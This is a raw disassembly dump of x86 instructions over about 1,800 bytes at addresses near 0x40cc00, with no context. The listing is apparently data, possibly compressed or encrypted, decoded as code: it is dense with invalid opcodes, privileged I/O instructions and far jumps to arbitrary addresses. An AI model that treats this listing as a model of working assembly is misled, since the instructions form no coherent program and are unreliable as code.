  40cbe4:	scas   eax,DWORD PTR es:[edi]
  40cbe5:	inc    edi
  40cbe6:	ret    
  40cbe7:	(bad)  
  40cbe9:	jecxz  0x40cc0c
  40cbeb:	inc    edx
  40cbec:	and    bh,BYTE PTR [ebp-0x7d]
  40cbef:	rcr    DWORD PTR ds:0x38553633,cl
  40cbf5:	fldcw  WORD PTR [edi]
  40cbf7:	cmp    ch,BYTE PTR [edi]
  40cbf9:	hlt    
  40cbfa:	repz test BYTE PTR [ecx],dl
  40cbfd:	repz xchg edx,eax
  40cbff:	in     eax,0x1f
  40cc01:	pop    es
  40cc02:	push   ds
  40cc03:	and    al,0xd6
  40cc05:	inc    edi
  40cc06:	pop    esi
  40cc07:	xchg   ecx,eax
  40cc08:	mov    eax,ecx
  40cc0a:	mov    dh,0xcc
  40cc0c:	inc    edx
  40cc0d:	imul   al
  40cc0f:	ins    BYTE PTR es:[edi],dx
  40cc10:	das    
  40cc11:	and    al,0xa0
  40cc13:	icebp  
  40cc14:	mov    dl,BYTE PTR [ebp+eiz*2-0x349b7c16]
  40cc1b:	and    ebp,ebx
  40cc1d:	loope  0x40cc47
  40cc1f:	fwait
  40cc20:	cwde   
  40cc21:	xchg   DWORD PTR [edx],edi
  40cc23:	sbb    DWORD PTR [edx-0x4b],ebx
  40cc26:	ins    DWORD PTR es:[edi],dx
  40cc27:	sti    
  40cc28:	iret   
  40cc29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc2a:	inc    ecx
  40cc2b:	jo     0x40cc2c
  40cc2d:	hlt    
  40cc2e:	add    al,0x6a
  40cc30:	adc    BYTE PTR [ebx+ecx*1-0x50f0b3fa],dh
  40cc37:	je     0x40cc40
  40cc39:	aad    0x2c
  40cc3b:	out    0x9d,eax
  40cc3d:	add    ebp,DWORD PTR [edx+0x51]
  40cc40:	cmp    cl,BYTE PTR [esi]
  40cc42:	bound  ebx,QWORD PTR [ebp+0x3a]
  40cc45:	test   edx,ecx
  40cc47:	dec    ecx
  40cc48:	daa    
  40cc49:	mov    DWORD PTR [esi-0x73],esi
  40cc4c:	(bad)  
  40cc4d:	sbb    al,0x76
  40cc4f:	jmp    0xd95f4db1
  40cc54:	pop    ecx
  40cc55:	jg     0x40cc08
  40cc57:	xchg   ebp,eax
  40cc58:	outs   dx,DWORD PTR ds:[esi]
  40cc59:	xchg   cl,bl
  40cc5b:	leave  
  40cc5c:	dec    esp
  40cc5d:	test   al,0xf6
  40cc5f:	and    dl,BYTE PTR [ebx-0x18]
  40cc62:	in     eax,dx
  40cc63:	hlt    
  40cc64:	add    eax,0xbef75b0d
  40cc69:	and    BYTE PTR [edx+0x8],al
  40cc6c:	rol    BYTE PTR [edx],1
  40cc6e:	push   esp
  40cc6f:	mov    eax,0x3d500229
  40cc74:	stos   BYTE PTR es:[edi],al
  40cc75:	mov    ebx,0x9e4c617a
  40cc7a:	and    BYTE PTR [edx],dl
  40cc7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc7d:	stc    
  40cc7e:	jg     0x40cc62
  40cc80:	adc    ah,al
  40cc82:	and    ch,BYTE PTR [ebp+eax*8+0x34f2a694]
  40cc89:	(bad)  
  40cc8a:	jp     0x40cc25
  40cc8c:	jmp    0xe78c:0x7940618e
  40cc93:	ret    
  40cc94:	push   esp
  40cc95:	ins    DWORD PTR es:[edi],dx
  40cc96:	push   eax
  40cc97:	xchg   edi,eax
  40cc98:	hlt    
  40cc99:	retf   0x8dc4
  40cc9c:	gs fucom st(0)
  40cca0:	aaa    
  40cca1:	gs mov bl,0x63
  40cca4:	inc    edx
  40cca5:	cmp    BYTE PTR fs:[edi-0x75],0xc5
  40ccaa:	int3   
  40ccab:	mov    WORD PTR [eax-0x767a26dd],es
  40ccb1:	repz into 
  40ccb3:	push   ebx
  40ccb4:	lahf   
  40ccb5:	aas    
  40ccb6:	(bad)  
  40ccb7:	fstp   TBYTE PTR [ecx+0x1773611c]
  40ccbd:	add    BYTE PTR [ebx],ch
  40ccbf:	(bad)  
  40ccc1:	inc    eax
  40ccc2:	inc    esp
  40ccc3:	shl    ecx,0xe3
  40ccc6:	add    ah,BYTE PTR [ebp+0x47]
  40ccc9:	mov    WORD PTR [ecx+0x7af60d67],ss
  40cccf:	jae    0x40ccf4
  40ccd1:	cmp    ebp,DWORD PTR [edi]
  40ccd3:	repz (bad) 
  40ccd5:	sbb    dh,al
  40ccd7:	leave  
  40ccd8:	std    
  40ccd9:	push   edx
  40ccda:	out    dx,al
  40ccdb:	cmp    al,0x50
  40ccdd:	fs retf 
  40ccdf:	out    0xcd,eax
  40cce1:	(bad)  [ecx]
  40cce3:	xlat   BYTE PTR ds:[ebx]
  40cce4:	in     eax,0x5e
  40cce6:	jle    0x40cd2f
  40cce8:	mov    ch,0x29
  40ccea:	mov    al,ds:0x54619f83
  40ccef:	mov    ds:0xe57fe501,eax
  40ccf4:	outs   dx,BYTE PTR ds:[esi]
  40ccf5:	nop
  40ccf6:	ror    DWORD PTR [ebx+0x5b],1
  40ccf9:	in     eax,0x54
  40ccfb:	add    DWORD PTR [ebp+0x27],0xffffffa7
  40ccff:	(bad)
  40cd03:	push   esi
  40cd04:	ins    DWORD PTR es:[edi],dx
  40cd05:	retf   
  40cd06:	or     esp,DWORD PTR [eax]
  40cd08:	cmp    ebx,DWORD PTR [ebx-0xf]
  40cd0b:	and    eax,0x9ff11a04
  40cd10:	jmp    0x40cc9e
  40cd12:	xchg   edi,eax
  40cd13:	int3   
  40cd14:	cs pushf 
  40cd16:	mov    BYTE PTR [edx+0x59],ch
  40cd19:	jge    0x40cceb
  40cd1b:	fcmovnb st,st(3)
  40cd1d:	and    eax,0x24fbbeb6
  40cd22:	fcomp  QWORD PTR [edx-0x1a]
  40cd25:	adc    eax,0x5f404431
  40cd2a:	ins    DWORD PTR es:[edi],dx
  40cd2b:	add    ebp,DWORD PTR [eax+ecx*1-0x71283b80]
  40cd32:	popf   
  40cd33:	pop    esp
  40cd34:	out    dx,eax
  40cd35:	add    ebp,esi
  40cd37:	cmp    bh,cl
  40cd39:	push   ecx
  40cd3a:	and    DWORD PTR [ebp+0x4b],edx
  40cd3d:	jp     0x40ccfb
  40cd3f:	cmp    BYTE PTR [edi-0x39],dl
  40cd42:	and    eax,0x34a6161e
  40cd47:	int3   
  40cd48:	shl    BYTE PTR [eax],1
  40cd4a:	mov    edi,0x68aac644
  40cd4f:	mov    ecx,0x483945b7
  40cd54:	mov    al,0xc0
  40cd56:	jle    0x40cdaf
  40cd58:	pop    ecx
  40cd59:	rol    DWORD PTR [edx],0xfc
  40cd5c:	adc    eax,0x1f5fd629
  40cd61:	jge    0x40cced
  40cd63:	xchg   ecx,eax
  40cd64:	fst    QWORD PTR ds:0x55a82d3a
  40cd6a:	out    0x1,eax
  40cd6c:	dec    edx
  40cd6d:	push   edx
  40cd6e:	test   eax,0x4f70b10b
  40cd73:	test   BYTE PTR [ecx],al
  40cd75:	fild   QWORD PTR [eax+0x5f]
  40cd78:	outs   dx,BYTE PTR ds:[esi]
  40cd79:	sbb    eax,esi
  40cd7b:	into   
  40cd7c:	mov    ebx,0xd6527301
  40cd81:	add    bh,BYTE PTR [edi]
  40cd83:	imul   ecx,DWORD PTR [edx+0x77],0xffffffd2
  40cd87:	xchg   ebp,eax
  40cd88:	out    0xde,al
  40cd8a:	and    BYTE PTR [edi+0x71499d28],dl
  40cd90:	mov    ds:0xab6663b,al
  40cd95:	mov    bh,BYTE PTR [ebp+0x931b8c7]
  40cd9b:	and    bl,BYTE PTR [esi+0x6389f213]
  40cda1:	mov    WORD PTR [edi+0x5a],ds
  40cda4:	pop    eax
  40cda5:	addr16 lock jmp 0xffee:0x39fcdcd
  40cdae:	retf   0xce05
  40cdb1:	lods   al,BYTE PTR ds:[esi]
  40cdb2:	fcmovb st,st(3)
  40cdb4:	cs push es
  40cdb6:	and    ch,BYTE PTR [esi+edi*1]
  40cdb9:	fnstsw WORD PTR [edi-0x4a]
  40cdbc:	mov    ecx,0x533e4ebb
  40cdc1:	lods   al,BYTE PTR ds:[esi]
  40cdc2:	dec    esp
  40cdc3:	dec    ecx
  40cdc4:	hlt    
  40cdc5:	mov    BYTE PTR [ebp+0x225ad9a1],ah
  40cdcb:	push   cs
  40cdcc:	out    dx,eax
  40cdcd:	daa    
  40cdce:	out    dx,al
  40cdcf:	mov    eax,ds:0xadc170b7
  40cdd4:	cmp    esp,ecx
  40cdd6:	js     0x40cda5
  40cdd8:	sbb    BYTE PTR [ebx+0x5ec7a3e2],al
  40cdde:	sub    cl,cl
  40cde0:	mov    al,ds:0xddc537c
  40cde5:	mov    dh,0xd6
  40cde7:	std    
  40cde8:	mov    WORD PTR [esi+ebx*2],?
  40cdeb:	xchg   BYTE PTR [edx-0x68895639],bl
  40cdf1:	ficomp WORD PTR [edi-0x3]
  40cdf4:	or     ecx,DWORD PTR [ecx+0x4137267f]
  40cdfa:	pop    ss
  40cdfb:	and    al,0xa
  40cdfd:	sbb    eax,edx
  40cdff:	and    bh,BYTE PTR [ebx+0x35]
  40ce02:	imul   edi,DWORD PTR [edi-0x42],0xdece6f94
  40ce09:	(bad)  
  40ce0a:	sbb    DWORD PTR [ebx+edi*1-0x591cefee],ebp
  40ce11:	adc    BYTE PTR [edx],ah
  40ce13:	push   esi
  40ce14:	cmp    al,0xdf
  40ce16:	jg     0x40cda7
  40ce18:	mov    ds:0x9674e510,al
  40ce1d:	ins    BYTE PTR es:[edi],dx
  40ce1e:	sub    al,BYTE PTR [ecx-0x6c]
  40ce21:	add    BYTE PTR [ebp+0x24],dh
  40ce24:	je     0x40ce75
  40ce26:	addr16 addr16 in eax,dx
  40ce29:	lods   al,BYTE PTR ds:[esi]
  40ce2a:	mov    ch,0xd3
  40ce2c:	in     al,dx
  40ce2d:	push   ss
  40ce2e:	mov    ds:0x8d2d7991,eax
  40ce33:	ret    
  40ce34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce35:	xor    eax,0x750a83d6
  40ce3a:	leave  
  40ce3b:	std    
  40ce3c:	fwait
  40ce3d:	nop
  40ce3e:	adc    eax,0xfb3749d7
  40ce43:	inc    esp
  40ce44:	jl     0x40ce94
  40ce46:	pop    ss
  40ce47:	retf   
  40ce48:	sub    dl,BYTE PTR [ecx+0x54f8226e]
  40ce4e:	fdiv   DWORD PTR [ebx+edi*8-0x3c]
  40ce52:	je     0x40ce90
  40ce54:	std    
  40ce55:	lods   al,BYTE PTR ds:[esi]
  40ce56:	sbb    BYTE PTR [edx],dh
  40ce58:	sub    eax,0xc8d912b3
  40ce5d:	stos   BYTE PTR es:[edi],al
  40ce5e:	repnz cdq 
  40ce60:	push   ecx
  40ce61:	pop    esi
  40ce62:	add    ecx,DWORD PTR [edx+0x5f78fa10]
  40ce68:	push   esp
  40ce69:	dec    ebp
  40ce6a:	push   eax
  40ce6b:	mov    edx,0x3f251004
  40ce70:	fs in  eax,0x8f
  40ce73:	dec    ebx
  40ce74:	push   0x6c
  40ce76:	mov    BYTE PTR [edx+0x153cdc9a],0xdd
  40ce7d:	fdivr  st(0),st
  40ce7f:	rcl    DWORD PTR [ebx+0x2e],1
  40ce82:	test   DWORD PTR [ecx+0x54123b16],esp
  40ce88:	fnsave [edi]
  40ce8a:	dec    edi
  40ce8b:	scas   al,BYTE PTR es:[edi]
  40ce8c:	inc    eax
  40ce8d:	scas   eax,DWORD PTR es:[edi]
  40ce8e:	lds    esp,FWORD PTR [ebp+0x65]
  40ce91:	jo     0x40ce7c
  40ce93:	push   es
  40ce94:	cmc    
  40ce95:	mul    BYTE PTR [ecx-0x54d76acc]
  40ce9b:	outs   dx,BYTE PTR ds:[esi]
  40ce9c:	xlat   BYTE PTR ds:[ebx]
  40ce9d:	cmp    DWORD PTR [ebx+0x77136e62],ebx
  40cea3:	jmp    0x2b0e82f4
  40cea8:	rcl    BYTE PTR [eax],cl
  40ceaa:	push   eax
  40ceab:	pop    ss
  40ceac:	mov    ds:0x60e8077c,eax
  40ceb1:	mov    WORD PTR [esi+0x12],fs
  40ceb4:	push   es
  40ceb5:	fidiv  DWORD PTR [eax+0x47]
  40ceb8:	cdq    
  40ceb9:	mov    ebp,0xb6f4935a
  40cebe:	hlt    
  40cebf:	jns    0x40ced2
  40cec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cec2:	mov    ds:0x196839f5,al
  40cec7:	cmp    eax,0xf5e72aec
  40cecc:	(bad)  
  40cecd:	int    0x4e
  40cecf:	out    dx,eax
  40ced0:	call   0x5320:0xde7ab5f5
  40ced7:	jl     0x40cf38
  40ced9:	mov    cl,0x77
  40cedb:	xchg   DWORD PTR ds:0x65d260a9,esp
  40cee1:	stc    
  40cee2:	aam    0xca
  40cee4:	(bad)
  40cee7:	in     eax,0xbd
  40cee9:	loope  0x40cf16
  40ceeb:	jg     0x40ce95
  40ceed:	inc    eax
  40ceee:	cld    
  40ceef:	push   ecx
  40cef0:	push   edx
  40cef1:	shr    BYTE PTR [ebx],1
  40cef3:	xor    eax,0x48637ee
  40cef8:	out    0x2d,eax
  40cefa:	pusha  
  40cefb:	mov    edx,0x89894c13
  40cf00:	arpl   WORD PTR [esi-0x3c],si
  40cf03:	daa    
  40cf04:	mov    dh,0xde
  40cf06:	sar    ah,cl
  40cf08:	pop    ds
  40cf09:	scas   al,BYTE PTR es:[edi]
  40cf0a:	sub    edx,DWORD PTR [edi]
  40cf0c:	push   edi
  40cf0d:	mov    ecx,?
  40cf0f:	call   0xf646:0xce75d18a
  40cf16:	lods   eax,DWORD PTR ds:[esi]
  40cf17:	adc    eax,0x916be4e1
  40cf1c:	push   esp
  40cf1d:	dec    edx
  40cf1e:	je     0x40ceee
  40cf20:	pusha  
  40cf21:	push   edx
  40cf22:	cld    
  40cf23:	fsubr  DWORD PTR [ecx+eiz*2]
  40cf26:	call   0x778405a2
  40cf2b:	iret   
  40cf2c:	jmp    0xc17b:0x140ef45f
  40cf33:	scas   eax,DWORD PTR es:[edi]
  40cf34:	mov    al,0xc2
  40cf36:	xor    eax,0x3ff88e5a
  40cf3b:	pop    esi
  40cf3c:	daa    
  40cf3d:	fsub   QWORD PTR [ebp+0x7a]
  40cf40:	test   DWORD PTR [esi+edx*2],esi
  40cf43:	pushf  
  40cf44:	scas   eax,DWORD PTR es:[edi]
  40cf45:	mov    dh,0xcf
  40cf47:	icebp  
  40cf48:	cmp    ecx,DWORD PTR [ecx]
  40cf4a:	cwde   
  40cf4b:	xchg   esp,eax
  40cf4c:	and    edx,DWORD PTR [ecx]
  40cf4e:	pop    ss
  40cf4f:	data16 mov BYTE PTR [edx+0x3c],bl
  40cf53:	pop    edi
  40cf54:	scas   al,BYTE PTR es:[edi]
  40cf55:	scas   al,BYTE PTR es:[edi]
  40cf56:	sbb    al,0x58
  40cf58:	xlat   BYTE PTR ds:[ebx]
  40cf59:	fsub   DWORD PTR [eax-0x48]
  40cf5c:	and    bl,0xd2
  40cf5f:	mov    al,0x64
  40cf61:	cmp    DWORD PTR [esi],ecx
  40cf63:	out    0x9c,eax
  40cf65:	mov    al,0xd
  40cf67:	and    eax,0xa725f116
  40cf6c:	fcomp  DWORD PTR [edi+0x15f023a5]
  40cf72:	push   ebp
  40cf73:	aas    
  40cf74:	lahf   
  40cf75:	dec    eax
  40cf76:	int    0x5d
  40cf78:	and    BYTE PTR [ecx+0x38],al
  40cf7b:	cdq    
  40cf7c:	cmp    eax,0xa9d1a11e
  40cf81:	ja     0x40cf18
  40cf83:	inc    edx
  40cf84:	dec    edx
  40cf85:	mov    BYTE PTR [esi],al
  40cf87:	ins    DWORD PTR es:[edi],dx
  40cf88:	sti    
  40cf89:	and    al,al
  40cf8b:	daa    
  40cf8c:	jl     0x40cfe9
  40cf8e:	dec    esp
  40cf8f:	jmp    0x6897:0xa1ad1fd9
  40cf96:	xor    eax,DWORD PTR [edi+0x59]
  40cf99:	inc    ebx
  40cf9a:	sti    
  40cf9b:	push   ds
  40cf9c:	aas    
  40cf9d:	sbb    ecx,DWORD PTR [edi+edx*4+0x62302ec3]
  40cfa4:	outs   dx,BYTE PTR ds:[esi]
  40cfa5:	mov    bh,0x10
  40cfa7:	xor    al,0x91
  40cfa9:	xchg   ebx,eax
  40cfaa:	and    al,0x37
  40cfac:	mov    ah,0xc8
  40cfae:	popf   
  40cfaf:	mov    ds:0xe3e5c8eb,eax
  40cfb4:	fwait
  40cfb5:	(bad)  
  40cfb6:	gs pop ebx
  40cfb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb9:	adc    ebp,DWORD PTR [ebx+0x13a3fe32]
  40cfbf:	fs pop ds
  40cfc1:	inc    esp
  40cfc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfc3:	jmp    0x8be68011
  40cfc8:	bound  ebp,QWORD PTR [ecx]
  40cfca:	jp     0x40cf59
  40cfcc:	aaa    
  40cfcd:	out    0xd1,al
  40cfcf:	cdq    
  40cfd0:	fbld   TBYTE PTR [edx+0x47]
  40cfd3:	push   eax
  40cfd4:	repz cmp ebx,DWORD PTR [edx]
  40cfd7:	inc    ebp
  40cfd8:	adc    BYTE PTR [eax],ch
  40cfda:	neg    DWORD PTR gs:[ecx+eiz*4]
  40cfde:	jno    0x40cfec
  40cfe0:	add    ebx,DWORD PTR [esi+0x15]
  40cfe3:	call   0x7a30:0x7a045303
  40cfea:	cmp    ebp,eax
  40cfec:	pop    ebp
  40cfed:	push   edx
  40cfee:	vdivps ymm5,ymm1,ymm1
  40cff2:	sub    BYTE PTR [ebx+0x5efb69c1],dl
  40cff8:	fimul  DWORD PTR [esp+ecx*4+0x13]
  40cffc:	imul   esi,DWORD PTR [eax+0x57e1c01],0xe3cfb67
  40d006:	xor    bl,BYTE PTR [eax-0x7bc0dff0]
  40d00c:	sbb    DWORD PTR [edx*2-0x4b9e67da],edx
  40d013:	xchg   ebp,eax
  40d014:	sub    eax,0x79bb7dd1
  40d019:	lock add DWORD PTR [ebp+0x30],eax
  40d01d:	cdq    
  40d01e:	dec    esi
  40d01f:	sahf   
  40d020:	sti    
  40d021:	mov    edx,0x4b2ab1d2
  40d026:	cmp    esp,DWORD PTR [ecx+eax*2+0x64]
  40d02a:	out    dx,al
  40d02b:	lods   al,BYTE PTR ds:[esi]
  40d02c:	and    DWORD PTR [ebx+0x56],0x2e
  40d030:	pop    ss
  40d031:	test   eax,0xee845b4c
  40d036:	ss pop edx
  40d038:	jecxz  0x40cfe3
  40d03a:	pop    esp
  40d03b:	lahf   
  40d03c:	imul   eax,DWORD PTR [edi],0x35dbe5b0
  40d042:	jp     0x40d074
  40d044:	cmp    al,0xd2
  40d046:	pop    edx
  40d047:	or     BYTE PTR [ecx-0x1a],al
  40d04a:	(bad)  
  40d04b:	fsubr  st(5),st
  40d04d:	imul   edi,eax,0x6e
  40d050:	or     ebp,DWORD PTR [esi+0x19]
  40d053:	scas   al,BYTE PTR es:[edi]
  40d054:	dec    esp
  40d055:	cld    
  40d056:	xchg   ebx,eax
  40d057:	xchg   edx,eax
  40d058:	pop    ds
  40d059:	cmp    DWORD PTR [edi],ebp
  40d05b:	jp     0x40d083
  40d05d:	and    DWORD PTR [esi],edx
  40d05f:	mov    edx,0x961003eb
  40d064:	cmp    DWORD PTR [edi+0x22],edi
  40d067:	hlt    
  40d068:	inc    eax
  40d069:	cs std 
  40d06b:	mov    esp,0xd2a43353
  40d070:	aaa    
  40d071:	mov    ebx,0x3fa158ec
  40d076:	xchg   ecx,eax
  40d077:	jb     0x40d060
  40d079:	push   eax
  40d07a:	scas   eax,DWORD PTR es:[edi]
  40d07b:	pop    ebx
  40d07c:	(bad)  
  40d07d:	std    
  40d07e:	xor    ebp,esp
  40d080:	adc    ecx,edx
  40d082:	sub    edi,eax
  40d084:	sbb    BYTE PTR [ebp-0x7d],dh
  40d087:	pop    ds
  40d088:	lds    ebp,FWORD PTR ds:0xf208592e
  40d08e:	inc    ebx
  40d08f:	adc    BYTE PTR [edx+0x4c5f9738],dl
  40d095:	pop    eax
  40d096:	mov    bh,0x83
  40d098:	jge    0x40d083
  40d09a:	outs   dx,DWORD PTR ds:[esi]
  40d09b:	or     BYTE PTR [ecx],bl
  40d09d:	(bad)  
  40d09e:	mov    ebx,DWORD PTR [ebx+0x44]
  40d0a1:	push   ebp
  40d0a2:	idiv   ebp
  40d0a4:	test   eax,0x66c43a7d
  40d0a9:	push   edi
  40d0aa:	inc    ebp
  40d0ab:	mov    ebp,DWORD PTR [ecx+eax*2+0x67]
  40d0af:	not    DWORD PTR [ebx-0x1]
  40d0b2:	mov    dh,BYTE PTR [edx-0x11e107f1]
  40d0b8:	push   edi
  40d0b9:	es clc 
  40d0bb:	ja     0x40d117
  40d0bd:	push   ecx
  40d0be:	or     BYTE PTR [edx],ch
  40d0c0:	pop    es
  40d0c1:	mov    edx,0xa2b5fcde
  40d0c6:	fild   WORD PTR [ecx+0x44]
  40d0c9:	adc    dl,cl
  40d0cb:	iret   
  40d0cc:	mov    edi,0xcf069547
  40d0d1:	xor    bh,ah
  40d0d3:	(bad)  
  40d0d5:	and    BYTE PTR [edx],0x90
  40d0d8:	popa   
  40d0d9:	stos   BYTE PTR es:[edi],al
  40d0da:	mov    ah,0x43
  40d0dc:	xlat   BYTE PTR ds:[ebx]
  40d0dd:	fldcw  WORD PTR [edx-0x54]
  40d0e0:	add    esi,DWORD PTR [edx+0x33]
  40d0e3:	add    al,0xb4
  40d0e5:	test   eax,0xf6cd71f8
  40d0ea:	(bad)  
  40d0eb:	jp     0x40d10b
  40d0ed:	fbld   TBYTE PTR [ebx+0x6b]
  40d0f0:	dec    edx
  40d0f1:	loope  0x40d0fe
  40d0f3:	inc    ebp
  40d0f4:	mov    bh,0x3b
  40d0f6:	sbb    al,0x2f
  40d0f8:	rol    DWORD PTR [ebx+0x141dcbb],0x44
  40d0ff:	pop    ecx
  40d100:	cmp    DWORD PTR [ecx+0x50],0x15846685
  40d107:	icebp  
  40d108:	pusha  
  40d109:	and    edx,DWORD PTR [edi+0x7818abb8]
  40d10f:	imul   ebx,DWORD PTR [ebp-0x6b46d2a5],0xffffffe0
  40d116:	dec    ebp
  40d117:	cld    
  40d118:	pop    ebp
  40d119:	fchs   
  40d11b:	pop    ds
  40d11c:	imul   dl
  40d11e:	les    ebx,FWORD PTR [edi-0x15]
  40d121:	imul   esp,DWORD PTR [eax],0x1cdc64d5
  40d127:	daa    
  40d128:	inc    ebp
  40d129:	push   esp
  40d12a:	imul   edi,esp,0x9608fc3d
  40d130:	repz es mov bh,0x3e
  40d134:	xchg   esp,eax
  40d135:	adc    BYTE PTR [ecx+ecx*8-0x7ceb074b],bh
  40d13c:	sub    bh,dl
  40d13e:	xor    al,BYTE PTR [edx]
  40d140:	mov    ecx,0x43b42b02
  40d145:	iret   
  40d146:	clc    
  40d147:	cmp    eax,edi
  40d149:	cmp    eax,0x73febb68
  40d14e:	xchg   esi,eax
  40d14f:	cdq    
  40d150:	fadd   QWORD PTR [edi]
  40d152:	xor    ebp,DWORD PTR [ecx+0x59]
  40d155:	rol    BYTE PTR [ecx],1
  40d157:	jmp    0x40d1a3
  40d159:	fisubr WORD PTR [ebp+0x3e360866]
  40d15f:	xchg   esi,eax
  40d160:	mov    cl,0xe1
  40d162:	gs dec ebp
  40d164:	xchg   esi,eax
  40d165:	mov    bh,0x87
  40d167:	mov    bh,0xf8
  40d169:	xor    eax,DWORD PTR [edi]
  40d16b:	imul   esi,edx,0xaadbdf71
  40d171:	cmp    ebp,DWORD PTR [ebx+0x1f559561]
  40d177:	shl    DWORD PTR es:[edi+edx*8+0x4dcc2eac],1
  40d17f:	popa   
  40d180:	mov    ebp,0x4f086a59
  40d185:	cmp    BYTE PTR [esi-0x63],0xca
  40d189:	pop    ebp
  40d18a:	out    dx,eax
  40d18b:	pop    ds
  40d18c:	call   0x3dad510a
  40d191:	adc    DWORD PTR [edx+0x62a62fd3],eax
  40d197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d198:	mov    ds:0xf00cf98c,eax
  40d19d:	mov    ds:0x3cc5adc4,al
  40d1a2:	pop    eax
  40d1a3:	dec    ebx
  40d1a4:	pop    es
  40d1a5:	out    0x8e,al
  40d1a7:	dec    esp
  40d1a8:	adc    eax,0x8e3e8f19
  40d1ad:	pop    ds
  40d1ae:	scas   al,BYTE PTR es:[edi]
  40d1af:	test   al,0xc4
  40d1b1:	cwde   
  40d1b2:	xor    dh,BYTE PTR [edx+0x3a]
  40d1b5:	mov    ecx,0x77a624e
  40d1ba:	push   ebp
  40d1bb:	push   ss
  40d1bc:	inc    ebx
  40d1bd:	add    BYTE PTR [edi-0x7b],0xbe
  40d1c1:	ffree  st(2)
  40d1c3:	push   ds
  40d1c4:	call   0x299f:0xbc5f4b8e
  40d1cb:	repz out dx,al
  40d1cd:	jle    0x40d15d
  40d1cf:	mov    al,0xaf
  40d1d1:	dec    ebx
  40d1d2:	fdiv   QWORD PTR [ecx+0x4ea45c10]
  40d1d8:	lahf   
  40d1d9:	mov    ch,0x9
  40d1db:	popa   
  40d1dc:	test   eax,0x373f7965
  40d1e1:	fst    DWORD PTR [eax]
  40d1e3:	adc    bl,BYTE PTR [ecx]
  40d1e5:	mov    ch,0xb3
  40d1e7:	xchg   esi,eax
  40d1e8:	and    ch,BYTE PTR [edi]
  40d1ea:	cmp    DWORD PTR [ecx+0x18],0x3b
  40d1ee:	sahf   
  40d1ef:	pop    esi
  40d1f0:	pop    es
  40d1f1:	inc    edx
  40d1f2:	push   edx
  40d1f3:	in     eax,dx
  40d1f4:	imul   ebp,DWORD PTR [eax-0x6b],0xffffffb4
  40d1f8:	ss jo  0x40d241
  40d1fb:	jb     0x40d236
  40d1fd:	sti    
  40d1fe:	and    eax,DWORD PTR [edx-0x5ea388a]
  40d204:	dec    edi
  40d205:	aas    
  40d206:	inc    edi
  40d207:	xchg   edx,eax
  40d208:	retf   0xb1b4
  40d20b:	clc    
  40d20c:	setg   BYTE PTR [esi]
  40d20f:	ror    BYTE PTR [edx+ebp*8],0x2f
  40d213:	sbb    BYTE PTR [esi+ecx*1-0x58],ch
  40d217:	mov    al,0x15
  40d219:	ficomp DWORD PTR [ebp-0x2b]
  40d21c:	rol    DWORD PTR ds:0x616c54af,0xfa
  40d223:	js     0x40d237
  40d225:	gs push ebp
  40d227:	sbb    BYTE PTR [edi+edx*1-0x50],bh
  40d22b:	outs   dx,DWORD PTR ds:[esi]
  40d22c:	mov    eax,ds:0x78fbb2da
  40d231:	xacquire xchg DWORD PTR [edx],esp
  40d234:	sub    bl,BYTE PTR [edx-0x7e1e68f4]
  40d23a:	sub    ch,BYTE PTR [ecx+esi*2]
  40d23d:	dec    ebx
  40d23e:	xchg   esi,eax
  40d23f:	mov    bp,0x12dd
  40d243:	or     BYTE PTR [edi-0x6b],ah
  40d246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d247:	push   0x7f7e72c3
  40d24c:	mov    ecx,0xe22703a
  40d251:	fs mov bl,0x38
  40d254:	cmp    eax,0xd5d3ecff
  40d259:	in     eax,0xea
  40d25b:	pop    ebp
  40d25c:	nop
  40d25d:	jno    0x40d2ad
  40d25f:	cmp    al,0xb5
  40d261:	nop
  40d262:	js     0x40d231
  40d264:	push   esp
  40d265:	inc    ecx
  40d266:	shl    BYTE PTR [ecx],1
  40d268:	loopne 0x40d267
  40d26a:	add    BYTE PTR [ebx+edi*1],ah
  40d26d:	out    dx,eax
  40d26e:	and    eax,DWORD PTR [ebx+0x47e41543]
  40d274:	sub    esp,DWORD PTR [eax-0x6a0538c6]
  40d27a:	or     ch,BYTE PTR [edi]
  40d27c:	in     eax,0x3c
  40d27e:	imul   DWORD PTR [eax+0x61b5c56d]
  40d284:	sub    esp,DWORD PTR [edi]
  40d286:	push   0x44b3da9b
  40d28b:	mov    dh,0xad
  40d28d:	adc    dh,BYTE PTR [edi+0x2e7bde79]
  40d293:	xchg   BYTE PTR [ebx+0x3db0b6c0],ch
  40d299:	mov    ebx,0x8e925ccb
  40d29e:	popf   
  40d29f:	sahf   
  40d2a0:	aam    0x20
  40d2a2:	fadd   QWORD PTR ss:[edx+0x63]
  40d2a6:	pop    edi
  40d2a7:	leave  
  40d2a8:	push   eax
  40d2a9:	test   eax,0xcad9fd57
  40d2ae:	pop    ecx
  40d2af:	dec    edx
  40d2b0:	dec    ebp
  40d2b1:	adc    eax,DWORD PTR [ebx+0x2c]
  40d2b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b5:	sub    DWORD PTR [ebx-0x14],edx
  40d2b8:	xchg   ecx,eax
  40d2b9:	not    dl
  40d2bb:	jl     0x40d309
  40d2bd:	dec    ebx
  40d2be:	lds    eax,FWORD PTR [esi+0x15]
  40d2c1:	push   ds
  40d2c2:	or     eax,0xe23ef64a
  40d2c7:	fst    QWORD PTR es:[edx]
  40d2ca:	jb     0x40d340
  40d2cc:	ret    
  40d2cd:	sti    
  40d2ce:	xor    bh,al
  40d2d0:	xlat   BYTE PTR ds:[ebx]
  40d2d1:	daa    
  40d2d2:	cmp    dh,dl
  40d2d4:	pop    esi
  40d2d5:	adc    BYTE PTR [eax],dl
  40d2d7:	xchg   BYTE PTR [eax+edx*2],cl
  40d2da:	lea    edi,[ecx+0x10]
  40d2dd:	adc    al,0x64
  40d2df:	jmp    FWORD PTR [ebx+edi*2-0xdb47bff]
  40d2e6:	outs   dx,DWORD PTR ds:[esi]
  40d2e7:	outs   dx,DWORD PTR ds:[esi]
  40d2e8:	cwde   
  40d2e9:	sti    
  40d2ea:	cwde   
  40d2eb:	mov    esp,DWORD PTR [esi-0x41f3b13f]
